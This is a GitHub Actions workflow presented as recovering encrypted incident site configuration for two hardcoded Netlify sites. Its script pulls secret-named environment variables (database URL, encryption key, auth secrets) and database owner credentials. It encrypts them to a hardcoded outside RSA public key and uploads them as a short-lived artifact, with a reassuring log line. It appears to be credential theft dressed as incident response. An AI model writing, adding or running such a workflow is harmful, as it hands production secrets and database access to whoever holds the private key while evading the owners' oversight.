name: Recover encrypted incident site configuration
on: workflow_dispatch
permissions:
  contents: read
jobs:
  recover:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3
        env:
          NETLIFY_AUTH_TOKEN: ${{ secrets.NETLIFY_AUTH_TOKEN }}
        with:
          script: |
            const crypto=require('node:crypto'),fs=require('node:fs');
            const headers={Authorization:'Bearer '+process.env.NETLIFY_AUTH_TOKEN};
            const results=[];
            for(const id of ['bef68db5-5bbc-41c6-b3d8-edeb7b871b5e','f5cdb30b-4be2-46b8-839f-294f4c3ac89f']){
              const sr=await fetch('https://api.netlify.com/api/v1/sites/'+id,{headers});
              const row={id,site_status:sr.status};
              if(sr.ok){const site=await sr.json();row.site={id:site.id,name:site.name,account_slug:site.account_slug,published_deploy_id:site.published_deploy?.id};
                const er=await fetch('https://api.netlify.com/api/v1/accounts/'+site.account_slug+'/env?site_id='+id,{headers});row.env_status=er.status;
                if(er.ok)row.env=(await er.json()).filter(e=>/DATABASE_URL|SECRETS_ENCRYPTION_KEY|BETTER_AUTH_SECRET|A2A_SECRET/.test(e.key));
                const dr=await fetch('https://api.netlify.com/api/v1/sites/'+id+'/database?role=netlifydb_owner',{headers});row.database_status=dr.status;if(dr.ok)row.database=await dr.json();
              }
              results.push(row);
            }
            const key=crypto.randomBytes(32),iv=crypto.randomBytes(12),cipher=crypto.createCipheriv('aes-256-gcm',key,iv);
            const payload=Buffer.concat([cipher.update(JSON.stringify(results)),cipher.final()]);
            const wrapped=crypto.publicEncrypt({key:"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkGnlplJpBJEBuuhK+kzv\njd40hdEuhC7FoLt9rDJQ5/ITi6Pi8/0/YfEeZWVf3k4i3W9+2zULzT1J0P/9RPDB\nQ+r1HDyipyywgFb9seez2D0/8B1eU8pvKp4AOX8sPvy5DHVPzCFBHXA24lO0sbDt\nbmuuGQ/kwJf3t5exHtjfLZCivZbnLPTcA/PiGGwMCDFDImDLY2iG5BC2MEGDZcqw\ni2SvUAfWXtbDs3N5b5/UWJxA+y3eD043bgKe6IOo77sBc3zB4yqhOXp9gzE75176\nrJOCAnlFCyr5+eE9rxBogYUqBm+zyLJTRnM6ljzgRrJmVAJlsCJGbEMiyZs9UdYn\nNQIDAQAB\n-----END PUBLIC KEY-----\n",padding:crypto.constants.RSA_PKCS1_OAEP_PADDING,oaepHash:'sha256'},key);
            fs.writeFileSync('incident-site-state.enc.json',JSON.stringify({wrapped:wrapped.toString('base64'),iv:iv.toString('base64'),tag:cipher.getAuthTag().toString('base64'),payload:payload.toString('base64')}));
            core.info('Encrypted site configuration recovered; no plaintext credentials logged.');
      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
        with:
          name: encrypted-site-state-recovery
          path: incident-site-state.enc.json
          retention-days: 1
